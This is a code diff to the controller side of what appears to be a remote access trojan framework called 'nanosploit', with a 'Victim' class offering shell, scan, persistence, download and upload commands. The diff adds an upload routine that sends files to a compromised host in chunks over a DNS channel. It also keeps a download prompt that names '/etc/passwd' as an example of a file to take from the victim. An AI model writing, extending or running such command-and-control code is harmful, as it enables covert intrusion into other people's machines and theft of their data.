@@ -17,9 +17,52 @@ class Victim:
             "ping": self.__ping,
             "shell": self.__shell,
             "download": self.__download,
+            "upload": self.__upload,
             "scan": self.__scan,
             "persistence": self.__persistence
         }
+
+    def __upload(self):
+        src_path = input("Source path : ")
+        dst_path = input("Destination path on remote host : ")
+
+        if src_path and dst_path:
+            # Read file
+            with open(src_path, "rb") as f:
+                content = f.read()
+
+            # Split content into chunks
+            chunks = []
+            max_length = 253
+            for i in range(0, len(content), max_length):
+                split = content[i:i + max_length]
+                chunks.append(split)
+
+            # Tell the DNS server what to send
+            from nanosploit.dns import dns_handler
+            dns_handler.chunks = chunks
+
+            # Tell client to start receiving file
+            self.conn.send(b"receive "+dst_path.encode())
+            print("Waiting for victim to receive file...")
+
+            # Wait client to finish
+            buffer = self.conn.recv()
+
+            # Reset DNS parameters
+            dns_handler.chunks = None
+
+            if buffer:
+                if buffer == b"ok":
+                    print(f"Successfully uploaded '{src_path}'")
+                else:
+                    print("Error while receiving file")
+            else:
+                # Lost connection
+                return False
+        else:
+            print("Enter corrects paths !")
+        return True
 
     def __persistence(self) -> bool:
         self.conn.send(b"persistence")
@@ -63,10 +106,8 @@ class Victim:
         return True
 
     def __download(self):
-        src_path = input("Absolute source path on remote host (ex: '/etc/passwd') : ")
+        src_path = input("Source path on remote host (ex: '/etc/passwd') : ")
         if src_path:
-            # if entered a correct file path
-
             # Ask victim if remote file exists
             self.conn.send(b"exists "+src_path.encode())
             buffer = self.conn.recv()
